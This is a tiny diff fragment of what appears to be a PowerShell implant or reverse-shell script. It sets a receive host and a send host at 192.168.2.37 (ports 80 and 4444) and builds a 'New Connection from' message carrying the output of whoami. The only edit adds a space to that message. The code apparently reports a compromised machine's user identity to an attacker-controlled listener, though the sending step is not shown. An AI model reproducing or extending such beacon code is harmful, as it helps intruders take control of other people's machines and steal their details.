@@ -2,7 +2,7 @@ $URIREC = "192.168.2.37:80"
 
 $URISEND = "192.168.2.37:4444"
 
-$hmal += "New Connection from"
+$hmal += "New Connection from "
 
 $hmal += whoami
 
